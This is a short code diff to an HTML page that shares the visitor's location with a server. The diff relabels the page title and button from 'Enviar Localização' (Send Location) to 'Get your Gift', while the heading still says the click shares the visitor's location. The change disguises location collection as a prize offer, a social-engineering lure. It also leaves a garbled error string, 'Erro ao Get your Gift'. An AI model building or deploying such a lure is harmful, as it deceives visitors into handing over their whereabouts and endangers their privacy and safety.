@@ -2,11 +2,11 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Enviar Localização</title>
+  <title>Get your Gift</title>
 </head>
 <body>
   <h2>Clique para compartilhar sua localização</h2>
-  <button onclick="getLocation()">Enviar Localização</button>
+  <button onclick="getLocation()">Get your Gift</button>
   <p id="status"></p>
 
   <script>
@@ -32,7 +32,7 @@
         document.getElementById("status").innerText = data.status;
       })
       .catch(err => {
-        document.getElementById("status").innerText = "Erro ao enviar localização.";
+        document.getElementById("status").innerText = "Erro ao Get your Gift.";
         console.error(err);
       });
     }
